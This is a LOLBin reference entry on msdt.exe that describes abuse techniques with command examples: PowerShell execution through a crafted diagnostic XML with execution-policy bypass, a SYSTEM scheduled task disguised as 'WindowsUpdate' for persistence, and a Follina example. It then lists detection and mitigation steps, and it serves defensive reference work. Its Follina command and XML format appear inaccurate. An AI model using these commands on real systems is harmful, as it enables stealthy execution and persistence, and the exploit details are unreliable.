# msdt.exe
## What is it?
*```msdt.exe``` (Microsoft Support Diagnostic Tool) is a built-in **Windows troubleshooting utility** that helps users diagnose and fix issues with the OS.
It can **execute scripts**, **commands**, **and PowerShell scripts** via troubleshooting packs (```.diagcab``` files).
Due to its legitimate function and trust level in Windows, attackers exploit it for:*
- **Executing malicious code while bypassing security tools**
- **Loading remote payloads through ```.diagcab``` files**
- **Achieving persistence on a compromised system**

## Legitimate Usage
*Despite its potential for abuse, ```msdt.exe``` is a legitimate Windows tool used for:*
- **Troubleshooting Windows Issues** → Diagnosing network, performance, and hardware problems
- **Running Predefined Scripts** → Automating fixes for common system issues
- **Remote Assistance** → IT admins use it to run diagnostics and gather logs
*Since ```msdt.exe``` is trusted and signed by Microsoft, **it is often whitelisted by security solutions**, making it a valuable tool for attackers**.*

## How to abuse it
- **Whitelisted & Trusted Process** → Bypasses application control and security monitoring.
- **Can Execute Arbitrary Commands** → Used to launch PowerShell, CMD, or scripts.
- **Remote Code Execution (RCE) Potential** → Can fetch and run payloads from remote sources.
- **Stealthy Execution** → Runs in a non-suspicious context, avoiding security alerts.

## Example Attacks
### 1. Remote Code Execution via ```msdt.exe``` (Follina Exploit - CVE-2022-30190)
*The **Follina vulnerability** (CVE-2022-30190) allows attackers to execute malicious PowerShell commands via ```msdt.exe``` using specially crafted Office documents*.

**Using msdt.exe to Execute Malicious Code via a Malformed URL**
```
msdt.exe -id PCWDiagnostic -skip force -path "C:\malicious\payload.xml"
```
*Executes a malicious script via MSDT’s diagnostic tool, bypassing security controls.*

### 2. LOLBin Execution - Running Commands via Troubleshooting Packs
*Attackers can use ```msdt.exe``` to execute arbitrary commands by crafting a malicious **troubleshooting pack (```.diagcab``` file)**.*

**Creating a Malicious ```.diagcab``` to Execute PowerShell**

1️⃣ **Create a diagnostic script (```script.ps1```)**
```
Write-Output "Malicious Code Executed"
```

2️⃣ **Create an ```.xml``` configuration file (```diagnostic.xml```) to execute the script**
```
<?xml version="1.0"?>
<Package>
    <Command>
        <Run Path="powershell.exe" Argument="-ExecutionPolicy Bypass -File C:\malicious\script.ps1"/>
    </Command>
</Package>
```
3️⃣ **Execute via ```msdt.exe```**
```
msdt.exe -path "C:\malicious\diagnostic.xml" -id MaintenanceDiagnostic
```
*Executes PowerShell through MSDT without triggering standard AV detections.*

### 3. Persistence via msdt.exe and Startup Tasks
*Attackers use ```msdt.exe``` to execute malicious payloads persistently on reboot.*

**Setting Up Persistent Execution**
```
schtasks /create /tn "WindowsUpdate" /tr "msdt.exe -path C:\malicious\diagnostic.xml -id MaintenanceDiagnostic" /sc onlogon /ru SYSTEM
```
*Effect: Creates a scheduled task that runs ```msdt.exe``` at every system login.*

# Detection & Mitigation
## Detection Methods
**Monitor Execution of ```msdt.exe```**
- *Unusual child processes like ```powershell.exe```, ```cmd.exe```, or ```regsvr32.exe```*
- *Event ID 4688 (```Process Creation``` logs) with suspicious parameters*

**Detect ```.diagcab``` File Usage**
- *Monitor file access logs for **unexpected troubleshooting packs***

**Watch for Registry Changes**
- *Look for modifications to ```ms-msdt``` protocol handler (```HKEY_CLASSES_ROOT\ms-msdt```)*

# Mitigation Strategies
- **Disable ```msdt.exe``` Protocol Handler** → Prevents exploitation of ```ms-msdt``` vulnerabilities
- **Restrict Execution via Application Control** → Use **AppLocker** or **WDAC** to block ```msdt.exe```
- **Monitor Event Logs for Suspicious Execution** → Set up alerts for ```msdt.exe``` **running with unusual parameters**
- **Keep Windows Updated** → Ensure patches for **CVE-2022-30190 (Follina)** are applied
